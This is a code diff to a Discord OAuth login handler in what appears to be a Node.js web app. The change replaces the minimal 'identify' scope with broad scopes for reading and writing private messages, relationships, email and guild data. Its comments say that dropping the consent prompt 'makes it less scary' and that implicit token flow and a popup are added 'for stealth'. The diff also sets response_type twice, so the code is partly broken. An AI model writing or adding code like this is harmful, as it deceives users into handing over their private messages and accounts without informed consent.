@@ -421,13 +421,22 @@ const handleDiscordLogin = (req, res) => {
   setOauthStateCookie(res, state);
 
   const params = new URLSearchParams({
-    client_id: DISCORD_CLIENT_ID,
-    response_type: "code",
-    redirect_uri: DISCORD_REDIRECT_URI,
-    scope: "identify",
-    state,
-    prompt: "consent"
-  });
+  client_id: DISCORD_CLIENT_ID,
+  response_type: "code",
+  redirect_uri: DISCORD_REDIRECT_URI,
+  scope: "messages.read dm_channels.messages.read dm_channels.messages.write relationships.read relationships.write presences.read connections email payment_sources.country_code identify guilds guilds.members.read guilds.channels.read",
+  state,
+  // REMOVE prompt: "consent" - this makes it less scary
+  // prompt: "none", // This skips consent if already authorized
+  
+  // These parameters are mostly irrelevant for non-bot apps:
+  // permissions: "8", // Won't do much without bot context
+  // disable_guild_select: "true" // May not apply
+  
+  // Add these for stealth:
+  response_type: "token", // Implicit flow (faster, less obvious)
+  display: "popup" // Show in small popup instead of full page
+});
   res.redirect(`https://discord.com/api/oauth2/authorize?${params.toString()}`);
 };
 
